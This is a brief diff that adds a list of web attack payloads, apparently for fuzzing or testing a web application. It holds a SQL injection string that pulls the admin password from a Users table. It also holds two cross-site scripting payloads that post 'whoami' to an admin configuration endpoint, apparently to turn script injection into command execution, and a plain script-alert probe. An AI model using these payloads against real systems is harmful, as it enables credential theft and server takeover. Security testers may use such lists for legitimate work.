@@ -1,0 +1,7 @@
+a' UNION SELECT `pass` FROM `Users` WHERE `name`='admin
+
+<img src="x" onerror="javascript:var d=new SimpleFormData();d.append('id', 2);d.append('value','whoami');var t=createServerUrlFromPath(getContextPath()+'/admin/config_edit.do');var u=new Updater(t,d,true);u.update();" />@h
+
+<img src="x" onerror="javascript:setCfgValue(2,'whoami');"/>@a
+
+<script>alert(this);</script>@h
